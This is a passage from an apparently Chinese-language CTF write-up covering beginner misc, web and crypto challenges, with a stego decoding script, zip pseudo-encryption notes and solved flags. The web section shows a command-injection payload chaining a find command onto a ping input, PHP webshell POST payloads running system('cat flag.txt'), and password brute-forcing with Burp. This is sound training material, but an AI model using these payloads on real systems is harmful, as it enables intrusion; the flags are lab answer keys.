-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import msvcrt</span><br><span class="line">import time</span><br><span class="line">b64chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line">with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:</span><br><span class="line">    bin_str &#x3D; &#39;&#39;</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        # 去除头尾的换行符</span><br><span class="line">        stegb64 &#x3D; str(line, &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">        # 基于base64解码又编码，达到去除隐写的符号的目的</span><br><span class="line">        row64 &#x3D; str(base64.b64encode(base64.b64decode(stegb64)),&quot;utf-8&quot;)</span><br><span class="line">        # 基于base64的隐写，都在最后一个字符上体现。因此算一下两个字符串最后一个字符的差值</span><br><span class="line">        offset &#x3D; abs(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]) - b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        print(offset)</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;))</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1])</span><br><span class="line">        #print(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        #print(b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        # 等号的数量*2等于最后返回字符串的长度</span><br><span class="line">        equalnum &#x3D; stegb64.count(&#39;&#x3D;&#39;)</span><br><span class="line">        if equalnum:</span><br><span class="line">            bin_str +&#x3D; bin(offset)[2:].zfill(equalnum * 2)</span><br><span class="line">        print(bin(offset))</span><br><span class="line">        print(bin(offset)[2:])</span><br><span class="line">        # 右对齐后，在头部填充0</span><br><span class="line">        print(bin(offset)[2:].zfill(equalnum * 2))</span><br><span class="line">        # 8个bit转换为一个字符</span><br><span class="line">        print(&#39;&#39;.join([chr(int(bin_str[i:i+8],2)) for i in range(0, len(bin_str), 8)]))</span><br><span class="line">        # time.sleep(3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="zip的伪加密"><a href="#zip的伪加密" class="headerlink" title="zip的伪加密"></a>zip的伪加密</h3><p>zip由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志，根据三个区域的不同，区分zip是非加密、伪加密还是加密的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区： </span><br><span class="line">50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密） 头文件标记后2bytes</span><br><span class="line">08 00：压缩方式 </span><br><span class="line">5A 7E：最后修改文件时间 </span><br><span class="line">F7 46：最后修改文件日期 </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">19 00 00 00：压缩后尺寸（25） </span><br><span class="line">17 00 00 00：未压缩尺寸（23） </span><br><span class="line">07 00：文件名长度 </span><br><span class="line">00 00：扩展记录长度 </span><br><span class="line">6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line">压缩源文件目录区： </span><br><span class="line"></span><br><span class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line"></span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line"></span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes</span><br><span class="line">08 00：压缩方式 </span><br><span class="line">5A 7E：最后修改文件时间 </span><br><span class="line">F7 46：最后修改文件日期 </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">19 00 00 00：压缩后尺寸（25） </span><br><span class="line">17 00 00 00：未压缩尺寸（23） </span><br><span class="line">07 00：文件名长度 </span><br><span class="line">24 00：扩展字段长度 </span><br><span class="line">00 00：文件注释长度 </span><br><span class="line">00 00：磁盘开始号 </span><br><span class="line">00 00：内部文件属性 </span><br><span class="line">20 00 00 00：外部文件属性 </span><br><span class="line"></span><br><span class="line">00 00 00 00：局部头部偏移量</span><br><span class="line"></span><br><span class="line">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line">压缩源文件目录结束标志： </span><br><span class="line">50 4B 05 06：目录结束标记 </span><br><span class="line">00 00：当前磁盘编号 </span><br><span class="line">00 00：目录区开始磁盘编号 </span><br><span class="line">01 00：本磁盘上纪录总数 </span><br><span class="line">01 00：目录区中纪录总数 </span><br><span class="line">59 00 00 00：目录区尺寸大小 </span><br><span class="line"></span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line"></span><br><span class="line">00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">无加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）</span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</span><br><span class="line"></span><br><span class="line">假加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00 </span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00</span><br><span class="line"></span><br><span class="line">真加密</span><br><span class="line">压缩源文件数据区的全局加密应当为09 00 </span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00 </span><br></pre></td></tr></table></figure>
-<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>原本一个字符使用8bit表示，使用base64编码后改为用6bit表示，不能除尽的部分补0</p>
-<h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查base64编码后面有几个等于号</span><br><span class="line">把字符串按照base64表转换成4*6的倍数位数二进制</span><br><span class="line">删除等于号的个数*8的bit</span><br><span class="line">按照6个bit一组转成字符</span><br></pre></td></tr></table></figure>
-<h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基于base64解码时尾部存在一定数量的bit不会被转义的情况，可以在此处植入想要隐写的字符</span><br></pre></td></tr></table></figure>
-<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>这题没看题解自己做的，感动哭了</p>
-<p>首先根据提示，这是一个linux系统光盘文件。放入centos中，使用file命令查看</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file f1fc23f5c743425d9e0073887c846d23</span><br><span class="line"></span><br><span class="line">Linux rev 1.0 ext3 filesystem data, UUID&#x3D;cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>
-<p>网上查阅如何使用ext3文件系统数据，使用mount命令挂载。注意要在root用户权限下使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop f1fc23f5c743425d9e0073887c846d23 &#x2F;mnt</span><br><span class="line"># -o loop提供了一个虚拟磁盘，&#x2F;mnt是挂载的目录</span><br></pre></td></tr></table></figure>
-<p>进入/mnt，随便搜搜flag相关字，发现在flag.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;O7avZhikgKgbF&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
-<p>查看flag.txt中的内容，根据字符串其后的等号判断为base64。解码后得到答案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure>
-<p>网上还有一种用winhex的做法</p>
-<h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>工具：kali的foremost，winhex，wireshark</p>
-<p>双击pcapng文件，通过搜索关键字“flag.txt”可知，传输了flag.txt文件</p>
-<p>通过kali下的foremost分离出传输flag.txt的压缩包。</p>
-<p>通过winhex，发现压缩包是真实加密的，无法通过更改十六进制字符直接获取flag.txt</p>
-<p>再次打开pcapng文件，大量的分析tcp流，查找可能相关的的文件。发现6666.jpg文件，还原出6666.jpg文件。</p>
-<p>jpg文件头是FFD8FF，文件尾是FFD9。将包含头尾的16进制字符串复制到winhex中，输出一个jpg文件。打开jpg文件，得到压缩包的解压密码</p>
-<p>最后得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="各类文件的标志头"><a href="#各类文件的标志头" class="headerlink" title="各类文件的标志头"></a>各类文件的标志头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jpg：FFD8FF</span><br><span class="line">png：89504E47</span><br><span class="line">gif：47494638</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="攻防世界-web-初级"><a href="#攻防世界-web-初级" class="headerlink" title="攻防世界 web 初级"></a>攻防世界 web 初级</h1><h2 id="view-souce"><a href="#view-souce" class="headerlink" title="view_souce"></a>view_souce</h2><p>按F12，看到注释源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ffd40408d5b1b8c2dad9aab623dd93ef&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>先用御剑或者dirsearch扫描一下给出的网站</p>
-<p>得到目录下存在robots.txt文件</p>
-<p>访问该文件，网页展示内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: f1ag_1s_h3re.php</span><br></pre></td></tr></table></figure>
-<p>访问f1ag_1s_h3re.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;57752958f46d76651078942ee34b88ba&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>同理，用御剑扫一下后台，存在index.php.bak文件</p>
-<p>访问这个文件，自动下载文件</p>
-<p>使用sublime text打开文件，得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>所需工具：firefox</p>
-<p>可选工具：burp，wireshark</p>
-<p>先打开网页，根据题目提示，在firefox按F12查看cookie</p>
-<p>根据提示访问cookie.php</p>
-<p>根据提示查看http response，得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;5c1980e2f03a088816f306f7680d5458&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>工具：firefox</p>
-<p>打开网页，显示按钮不能按</p>
-<p>使用firefox，按F12检查网页源码，把button处的disabled去掉，即可提交</p>
-<p>提交后得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;a8efb264c88f7cba483ed431888a1d32&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>目的：爆破弱密码</p>
-<p>工具：burp</p>
-<p>proxy拦截提交的请求，将请求send to intruder，在intruder的position中更改数据包，使得提交的指定字段为变量，在intruder的payload中载入字典，点击attack</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4b4dda09ed661c8976f965b0681de325&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h2><p>输入localhost，看到请求为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
-<p>尝试注入语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; select database(); #</span><br></pre></td></tr></table></figure>
-<p>得到请求为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;+select+database();+#</span><br></pre></td></tr></table></figure>
-<p>说明不能注入</p>
-<p>参考writeup，直接在命令行执行的ping，可以执行其他语句。又flag一般放在txt中，输入下列语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find &#x2F; -name &quot;*.txt&quot; | grep flag</span><br></pre></td></tr></table></figure>
-<p>看到/home/flag.txt</p>
-<p>查看文件内容得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;168a646a5815f5b2f0e42e56812943d5&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>需要知识点：php的弱类型比较</p>
-<p>需要工具：直接在浏览器提交就行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写法1：?a&#x3D;&#39;0&#39;&amp;b&#x3D;1235a # 使a为字符串，b为非数字的一种变量</span><br><span class="line">写法2：?a&#x3D;0a&amp;b&#x3D;12345%00 # %00表示阶段，可以使b不为数字或数字字符串</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="php的弱类型比较"><a href="#php的弱类型比较" class="headerlink" title="php的弱类型比较"></a>php的弱类型比较</h3><p>php有两种判断相等的方法，==，===</p>
-<p>==会将两边值进行强制类型转换后在判断</p>
-<p>===同时判断类型和值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">if(&quot;1admin&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;true</span><br><span class="line">if(&quot;admin1&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;false</span><br><span class="line">if(&quot;0e12324&quot;&#x3D;&#x3D;&quot;0e1324&quot;)&#x2F;&#x2F;true，当做科学技术法，都是0</span><br></pre></td></tr></table></figure>
-<p>get_post</p>
-<p>工具：firefox的hackbar插件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;f5206ff77800e22928b4d81206e083e5&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>工具：burpsuite</p>
-<p>在burp的proxy里，把包拦下来，按照提示加入这两条就行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure>
-<p>得到答案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;2db9b3a38c581792bea6f015e6bdfdc8&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="XFF和Referer"><a href="#XFF和Referer" class="headerlink" title="XFF和Referer"></a>XFF和Referer</h3><p>X-Forwarded-For：浏览器访问服务器时，使用的IP</p>
-<p>Referer：浏览器告诉服务器，自己从哪个IP跳转来的</p>
-<p>web_shell</p>
-<p>考察：php一句话木马，php执行shell命令</p>
-<p>工具：中国蚁剑，中国菜刀，hackbar</p>
-<p>做法1：中国蚁剑or中国菜刀</p>
-<p>菜刀可以绕过认证部分，直接拿到webshell权限，之后查找flag即可</p>
-<p>做法2：hackbar</p>
-<p>在post data中写入 以下语句</p>
-<p>首先查找当前目录文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
-<p>写入以下任意一句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;passthru(&quot;cat flag.txt&quot;);</span><br><span class="line">shell&#x3D;system(&quot;cat flag.txt&quot;)</span><br></pre></td></tr></table></figure>
-<h3 id="php执行shell命令"><a href="#php执行shell命令" class="headerlink" title="php执行shell命令"></a>php执行shell命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string system ( string $command [, int &amp;$return_var ] )</span><br><span class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
-<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>考察：js阅读，转码</p>
-<p>阅读js源码，发现dechiffre不管输入什么，都会根据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65</span><br></pre></td></tr></table></figure>
-<p>返回一个值。ASCII码范围为0~127，猜测这几个值为字符的ASCII码表示</p>
-<p>代码里有一段十六进制的长字符串，猜测为答案</p>
-<p>先把长字符串转换为十进制，再转换为字符，得到答案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="攻防世界-crypto初级"><a href="#攻防世界-crypto初级" class="headerlink" title="攻防世界 crypto初级"></a>攻防世界 crypto初级</h1><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>考察：凯撒密码</p>
-<p>根据题目提示，将得到字符串进行凯撒密码的解密即可</p>
-<p>提供的字符串为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br></pre></td></tr></table></figure>
-<p>oknqdbqmoq部分解密后应该就是cyberspace，利用这一点算出加解密时需要的步数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;you_have_learned_caesar_encryption&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>考察：摩斯密码</p>
-<p>根据题目提示，将01字符串转换为摩斯密码。其中1为-，0为.，空格为/</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;---&#x2F;.-.&#x2F;...&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;..&#x2F;...&#x2F;...&#x2F;---&#x2F;..&#x2F;-.&#x2F;-&#x2F;.&#x2F;.-.&#x2F;.&#x2F;...&#x2F;-&#x2F;..&#x2F;-.&#x2F;--.</span><br></pre></td></tr></table></figure>
-<p>使用在线转换器得到答案。注意若答案为大写，需要转换为小写后提交。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;morsecodeissointeresting&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h2><p>考察：云影密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;WELLDOWN&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="云影密码"><a href="#云影密码" class="headerlink" title="云影密码"></a>云影密码</h3><p>只有84210五种数字的字符串，以0位分隔符，数字相加后转换为对应的大写英文字母。如8421=15=O</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br></pre></td></tr></table></figure>
-<h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>考察：Railfence-cipher</p>
-<p>根据题目提示，可能是栅栏密码。尝试后并未得出有效答案</p>
-<p>根据wp，为一种变形的栅栏密码Railfence-ciper</p>
-<p>代码写起来挺啰嗦的，找一个在线的解码器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br><span class="line">cyberpeace&#123;railfence_cipher_gogogo&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><p>考察：Morse，培根密码</p>
-<p>打开附件，得到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;.-&#x2F;-.--&#x2F;..--.-&#x2F;-...&#x2F;.&#x2F;..--.-&#x2F;....&#x2F;.-&#x2F;...-&#x2F;.&#x2F;..--.-&#x2F;.-&#x2F;-.&#x2F;---&#x2F;-&#x2F;....&#x2F;.&#x2F;.-.&#x2F;..--.-&#x2F;-..&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;....&#x2F;....&#x2F;....&#x2F;....&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-</span><br></pre></td></tr></table></figure>
-<p>使用在线摩根密码<a target="_blank" rel="noopener" href="http://moersima.00cha.net/%E8%A7%A3%E5%AF%86%E5%90%8E%EF%BC%8C%E5%BE%97%E5%88%B0">http://moersima.00cha.net/解密后，得到</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">may be have another decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</span><br></pre></td></tr></table></figure>
-<p>abab的可能为培根密码，<a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></p>
-<p>解密后得到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACKANDDEFENCEWORLDISINTERESTING</span><br></pre></td></tr></table></figure>
-<p>根据题目提示修改相应格式后提交flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;attackanddefenceworldisinteresting&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p>考察：ASCII码，base64编码</p>
